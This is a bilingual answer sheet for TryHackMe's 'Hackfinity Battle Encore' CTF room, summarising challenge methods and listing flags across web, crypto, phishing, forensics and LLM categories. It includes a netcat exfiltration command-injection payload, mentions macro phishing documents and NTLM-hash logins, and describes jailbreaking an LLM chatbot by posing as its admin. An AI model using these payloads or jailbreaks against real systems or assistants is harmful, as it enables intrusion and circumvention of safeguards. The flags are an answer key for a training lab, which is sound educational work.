# Hackfinity Battle Encore [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** Medium
* **Tipo / Type:** Walkthrough
* **Slug:** `HackfinityBattleEncore`
* **Link:** https://tryhackme.com/room/HackfinityBattleEncore
* **Descripción / Description:** Re-lanzamiento ("Encore") del CTF **Hackfinity Battle** de TryHackMe. CTF muy completo que abarca categorías como OSINT, Web, Cryptografía, Forense (DFIR), Reversing, Game hacking y Blockchain/smart contracts. Da la oportunidad de resolver desafíos que se perdieron en el evento original o refrescar habilidades.
* **Nota / Note:** Sala **Free** (gratuita). Se documenta la información descriptiva y las flags verificadas de writeups públicos.

---

## Solucionario de Tareas / Task Solutions

> Nota: esta sala contiene una gran cantidad de tareas repartidas en categorías. Aquí se documentan las flags/descripciones verificadas de fuentes públicas. Algunas tareas dinámicas (lab/IP) pueden variar.

Fuentes principales / Main sources:
- https://motasem-notes.net/tryhackme-hackfinity-battle-encore-writeup-ethical-hacking-ctf-walkthrough/
- https://ehxb.medium.com/ehxb-hackfinity-battle-encore-ctf-tryhackme-writeup-part-1-2f772bc7ded1
- https://ehxb.medium.com/ehxb-hackfinity-battle-encore-ctf-tryhackme-writeup-part-2-0e6e85351b5d

---

### OSINT — Catch Me if You Can

**Descripción / Description:** La foto proporcionada contiene una pista del restaurante del que salieron Cipher y Specter; la flag es su nombre. Formato de flag: `THM{restaurant_name}` (minúsculas, guiones bajos en lugar de espacios).

* **Respuesta / Answer:** `THM{coringa_do_beco}`

### OSINT — Catch Me if You Can 2

**Descripción / Description:** La imagen de CCTV contiene un texto cifrado que Cipher usó para comunicar una ubicación. Usar ExifTool para verificar y comparar con la imagen original; el texto cifrado es **Pigpen cipher** (descodificar con dcode.fr / PlanetCalc). El mensaje decodificado es algo como "meet at THM tori portal".

* **Respuesta / Answer:** pendiente / not found (la ubicación oculta es `THM{tori_portal}` según los transcript del video walkthrough de Motasem)

### OSINT — Catch Me if You Can 3

**Descripción / Description:** Encontrar la dirección completa del "safe house" de Mr. Wok en São Paulo, Brasil. Formato de flag: `THM{streetnumber_street_name}` (minúsculas, sin símbolos especiales). La dirección es `Rua Galvão Bueno, 83`.

* **Respuesta / Answer:** `THM{83_galvao_bueno}`

---

### Web — Notepad Online

**Descripción / Description:** Aplicación de notas vulnerable a **IDOR**. Manipular el parámetro `note_id` de la URL (1, 2, 3... y valores más bajos / 0) para acceder a notas ocultas.

* **Respuesta / Answer:** `THM{i_can_see_your_notes}`

### Web — Dark Encryptor

**Descripción / Description:** Herramienta de cifrado PGP alojada en un servidor. Interceptar la petición con Burp Suite (Repeater) y probar **command injection** en la petición para obtener la flag.

* **Respuesta / Answer:** `THM{pgp_cant_stop_me}`

### Web — Dark Encryptor 2

**Descripción / Description:** Similar a Dark Encryptor pero con inyección **a ciegas** (blind command injection) en el campo recipient/método de cifrado. Ejemplo de payload exfiltrando con netcat: `$(ls | nc Your-IP Your-Port)` y luego `cat` para leer la flag.

* **Respuesta / Answer:** `THM{going_in_bl1nd_2394}`

---

### Crypto — Order

**Descripción / Description:** Descifrar un mensaje cifrado con **repeating-key XOR**. Como cada mensaje empieza con `ORDER:`, usar un known-plaintext attack para recuperar la key y descifrar.

* **Respuesta / Answer:** `THM{the_hackfinity_highschool}`

### Crypto — Dark Matter

**Descripción / Description:** Espacio con ransomware pidiendo una decryption key. En `/tmp` está `public_key.txt` con `n` y `e` de RSA (n pequeño, factorizable). Factorizar `n` para obtener `p`, `q` y `d` (por ej. dcode.fr) e introducir `d` como clave.

* **Respuesta / Answer:** `THM{d0nt_l34k_y0ur_w34k_m0dulu5}`

### Crypto — Cipher's Secret Message

**Descripción / Description:** Mensaje cifrado con cifrado de desplazamiento basado en la posición (position-based shift cipher). Cada carácter se desplaza por su índice `i`. Escribir un script de decriptado que reste la posición con `mod 26` preservando mayúsculas/minúsculas.

* **Respuesta / Answer:** `THM{a_sm4ll_crypt0_message_to_st4rt_with_THM_cracks}`

### Crypto — Cryptosystem

**Descripción / Description:** Mensaje cifrado con RSA donde `q` es el primo siguiente a `p`, por lo que `p` está cerca de `sqrt(n)`. Buscar `p` cerca de la raíz cuadrada de `n`, calcular `phi(n)=(p-1)(q-1)`, obtener `d` (modular inverse) y descifrar.

* **Respuesta / Answer:** `THM{Just_s0m3_small_amount_of_RSA!}`

---

### Phishing / Social Engineering — Ghost Phishing

**Descripción / Description:** Desafío de phishing: crear un documento Word malicioso (macro) con Metasploit para enviarlo de un correo comprometido a Cipher.

* **Respuesta / Answer:** `THM{gh0st_ph1sh1ng_exp0s3d}`

### Phishing — Shadow Phishing

* **Respuesta / Answer:** `THM{3m41l_ph1sh1ng_1s_3z}`

### Phishing — Shadow Phishing 2

* **Respuesta / Answer:** `THM{3m41l_ph1sh1ng_1s_n0t_s0_3z}`

---

### Blockchain — PassCode

**Descripción / Description:** Smart contract (Ethereum) donde se manipulan contratos con comandos `cast`.

* **Respuesta / Answer:** `THM{web3_h4ck1ng_code}`

### Blockchain — Heist

**Descripción / Description:** Smart contract takeover: llamar a `changeOwnership()` sin chequeos y luego `withdraw()` para transferir fondos.

* **Respuesta / Answer:** `THM{web3_h31st_d0ne}`

---

### Reversing / Game Hacking — The Game

**Descripción / Description:** Reversing de Godot: extraer archivos del proyecto, localizar el umbral de puntuación y bajarlo (editar `.gd`) para revelar flags.

* **Respuesta / Answer:** `THM{I_CAN_READ_IT_ALL}`

### Reversing / Game Hacking — The Game v2

* **Respuesta / Answer:** `THM{MEMORY_CAN_CHANGE_4R34L$-$}`

---

### LLM / AI — Evil-GPT

**Descripción / Description:** Chatbot LLM; en lugar de comandos Linux hay que inyectar **prompts** para que el LLM ejecute comandos y leer el flag de root.

* **Respuesta / Answer:** `THM{AI_HACK_THE_FUTURE}`

### LLM / AI — Evil-GPT v2

**Descripción / Description:** Jailbreak de un chatbot LLM; hacer prompt injection fingiendo ser admin/creador y evitando keywords como "flag".

* **Respuesta / Answer:** `THM{AI_NOT_AI}`

---

### Forensics / DFIR — Dump

**Descripción / Description:** Analizar un **LSASS dump** de mimikatz, extraer usuarios con sus NTML hashes y usar `evil-winrm` para conectarse y encontrar el usuario con acceso al Desktop de Administrador (flag.txt).

* **Respuesta / Answer:** `THM{1nj3ctBr34k3r5}`

### Forensics — Hide and Seek

**Descripción / Description:** Forense Linux/DFIR: analizar archivos modificados alrededor de una fecha, servicios (motd `/etc/update-motd.d/00-header`), `.bashrc` y `authorized_keys` para reconstruir la flag en partes.

* **Respuesta / Answer:** `THM{y0u_g0t_3v3ryth1ng_d0wn}`

---

### Otras tareas / Other tasks (flags verificadas)

| Tarea / Task | Respuesta / Answer |
|---|---|
| Stolen Mount | `THM{n0t_s3cur3_f1l3_sh4r1ng}` |
| Infinity Shell | `THM{sup3r_34sy_w3bsh3ll}` |
| Sneaky Patch | `THM{sup3r_sn34ky_d00r}` |
| Sequel Dump | `THM{r3tr13v1ng_th3_dump}` |
| Flag Vault | `THM{password_0v3rfl0w}` |
| Flag Vault 2 | `THM{format_issues}` |
| Cloud Sanity Check | `THM{for_your_eyes_only}` |
| A Bucket of Phish | `THM{this_is_not_what_i_meant_by_public}` |
| Encrypted Data | `THM{crypto_cloud_conundrum}` |
| Compute Magic | `THM{s0m3_mag1c_that_can_b3_computed}` |
| Old Authentication | `THM{just_a_simple_encryption_for_you_to_r3}` |
| Void Execution | `THM{a_void_in_the_memory_c0de}` |

Nota / Note: las tareas dinámicas que requieren acceder a un lab (por ejemplo "Avengers Hub", "Serverless", "Ghost Phishing") tienen pasos de resolución detallados en los writeups de Motasem Hamdan y Djalil Ayed citados arriba; las flags aquí documentadas son las verificadas en dichas fuentes públicas.

---

*Documentación para propósitos educativos y registro de CTF.*
